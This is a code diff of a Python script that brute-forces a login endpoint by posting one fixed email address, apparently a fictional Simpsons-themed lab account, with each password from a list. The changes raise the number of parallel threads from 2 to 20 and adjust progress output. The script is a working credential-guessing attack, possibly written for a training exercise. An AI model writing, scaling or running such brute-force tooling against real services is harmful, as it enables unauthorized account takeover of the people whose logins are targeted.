@@ -13,6 +13,7 @@ failed = 0
 
 def test_password(password):
     global failed
+    #print(failed)
     data = {"email": 'Maggie.Simpson@simpsonmail.com', "password": password, }
     data_json = json.dumps(data)
     headers = {'Content-type': 'application/json;charset=utf-8',
@@ -31,9 +32,10 @@ def test_password(password):
         sys.exit()
     else:
         failed = failed + 1
-        if failed % 100 == 0:
+        if failed % 10000 == 0:
             print(failed)
 
-print(len(passwords))
-with ThreadPool(2) as p:
+print("Total Passwords:",len(passwords))
+with ThreadPool(20) as p:
     p.map(test_password, passwords)
+print("Finished")
